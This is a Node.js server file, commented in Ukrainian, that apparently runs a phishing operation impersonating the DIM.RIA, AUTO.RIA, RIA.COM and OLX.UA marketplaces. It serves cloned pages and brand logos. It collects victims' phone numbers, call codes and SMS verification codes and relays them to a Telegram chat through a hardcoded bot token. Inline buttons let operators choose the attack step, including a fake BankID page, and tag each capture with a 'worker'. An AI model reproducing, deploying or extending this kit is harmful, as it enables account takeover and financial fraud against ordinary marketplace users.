const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
// ЗМІНИ: Використовуємо спеціалізовану бібліотеку для Telegram
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// ЗМІННІ TELEGRAM
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const BANKID_URL = "https://idverification.onrender.com";

// Ініціалізація бота. 'polling: true' використовується для простоти,
// але для продакшену на зовнішньому хостингу краще використовувати вебхуки.
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// === ЛОГОТИПИ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA",
    autoria: "AUTO.RIA",
    ria: "RIA.COM",
    olx: "OLX.UA"
};

app.use(bodyParser.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    // Ваш index.html має бути в тій же директорії, що й server.js
    res.sendFile(path.join(__dirname, 'index.html')); 
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// === ОНОВЛЕНА ФУНКЦІЯ ВІДПРАВКИ В TELEGRAM ===
async function sendToTelegram(message, reply_markup = null) {
    try {
        await bot.sendMessage(CHAT_ID, message, {
            parse_mode: 'Markdown',
            reply_markup: reply_markup
        });
        return true;
    } catch (err) {
        console.error('Telegram error:', err.message);
        // Не повертаємо помилку 403, щоб не зупиняти процес, якщо щось піде не так
        return false; 
    }
}

// === ОБРОБКА НАТИСКАННЯ ІНЛАЙН-КНОПОК ===
bot.on('callback_query', async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data; // Наприклад: 'call_+380XXXXXXXXX'
    const match = data.match(/^(call|sms)_(\+\d+)$/);
    
    if (!match) {
        // Ігноруємо невідомі або 'ignore' запити
        bot.answerCallbackQuery(callbackQuery.id, { text: "Невідома дія." });
        return;
    }

    const method = match[1]; 
    const phone = match[2]; 
    const methodText = method === 'call' ? 'Звонок 📞' : 'Код ✉️';
    
    // 1. Змінюємо клавіатуру на "Обрано", щоб запобігти повторним натисканням
    await bot.editMessageReplyMarkup(
        { inline_keyboard: [
            [{ text: `✅ Обрано: ${methodText}`, callback_data: 'ignore' }]
        ] },
        { chat_id: message.chat.id, message_id: message.message_id }
    );
    
    // 2. Надсилаємо окремий лог про вибір методу
    const logMessage = `*КНОПКА НАТИСНУТА: ${methodText}*\n*Номер:* \`${phone}\``;
    await bot.sendMessage(CHAT_ID, logMessage, { parse_mode: 'Markdown' });

    // 3. Відповідь на запит, щоб прибрати "годинник" у користувача
    bot.answerCallbackQuery(callbackQuery.id, { text: `Ви обрали: ${methodText}` });
});


// === ОСНОВНИЙ ОБРОБНИК ДАНИХ ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;

    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';

    let message = '';
    let reply_markup = null;
    let ok = false;
    
    const workerTag = worker ? `\n*Воркер:* @${worker}` : '';

    if (step === 'phone' && phone) {
        // Крок 1: Введений телефон
        message = `*НОВИЙ ЛОГ* 🔔\n*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна${workerTag}`;
        
        // Інлайн-кнопки, які ми тепер обробляємо
        reply_markup = {
            inline_keyboard: [
                [{ text: "📞 Звонок", callback_data: `call_${phone}` }],
                [{ text: "✉️ Код", callback_data: `sms_${phone}` }],
                [{ text: "🏦 BankID", url: BANKID_URL }]
            ]
        };
        ok = await sendToTelegram(message, reply_markup);

    } 
    else if (step === 'method_call' && phone) {
        // Крок 2 (з фронтенду): Користувач обрав "Звонок" на веб-сторінці
        message = `*ОБРАНО МЕТОД (ФРОНТЕНД):* Звонок 📞\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    }
    else if (step === 'method_sms' && phone) {
        // Крок 2 (з фронтенду): Користувач обрав "Код" на веб-сторінці
        message = `*ОБРАНО МЕТОД (ФРОНТЕНД):* Код ✉️\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    }
    else if (step === 'method_bankid' && phone) {
        // Крок 2 (з фронтенду): Користувач обрав "BankID"
        message = `*ОБРАНО МЕТОД (ФРОНТЕНД):* BankID 🏦\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    }
    else if (step === 'call_code' && code && phone) {
        // Крок 3: Введений 4-значний код
        message = `*КОД ДЗВІНКА:* \`${code}\`\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    }
    else if (step === 'sms_code' && code && phone) {
        // Крок 3: Введений 6-значний SMS-код
        message = `*SMS КОД:* \`${code}\`\n*Номер:* \`${phone}\`\n*ПРОЕКТ:* ${projectName}${workerTag}`;
        ok = await sendToTelegram(message);
    } 
    else {
        return res.status(400).json({ success: false });
    }

    res.json({ success: ok });
});

app.listen(PORT, () => {
    console.log(`Сервер: http://localhost:${PORT}`);
    console.log(`Панель: http://localhost:${PORT}/panel`);
    setTimeout(() => {
        sendToTelegram(`*Проекты успешно стали на сервер* ✅\nНаши проекты: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
    }, 3000);
});
